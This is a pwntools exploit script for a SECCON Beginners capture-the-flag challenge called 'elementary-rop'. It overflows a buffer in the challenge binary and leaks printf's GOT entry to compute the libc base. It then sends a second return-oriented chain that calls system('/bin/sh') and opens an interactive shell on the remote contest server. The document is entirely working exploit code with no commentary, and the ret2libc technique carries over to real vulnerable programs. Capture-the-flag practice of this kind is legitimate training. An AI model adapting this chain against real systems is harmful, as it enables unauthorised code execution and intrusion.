from pwn import *
elf_file = FILENAME = './chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


HOST = 'elementary-rop.beginners.seccon.games'
POST = 9003
libc = ELF("./libc.so.6")


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b main''')
ret = 0x004011ec
prdi = 0x0040115a
printf_plt = 0x401030
printf_got = 0x403fd0
gets_main_add = 0x40117b

payload  = b'\x00'*0x28
payload += p64(ret)
payload += p64(prdi)
payload += p64(printf_got)
payload += p64(printf_plt)
payload += p64(0x401074)
c.sendlineafter(b': ',payload)
printf_leak = unpack(c.recv(6)+b'\x00\x00')
libc.address = printf_leak - libc.sym['printf']
payload  = b'a'*0x28
payload += p64(ret)
payload += p64(prdi)
payload += p64(libc.search('/bin/sh\x00').next())
payload += p64(libc.sym['system'])
c.sendline(payload)
c.interactive()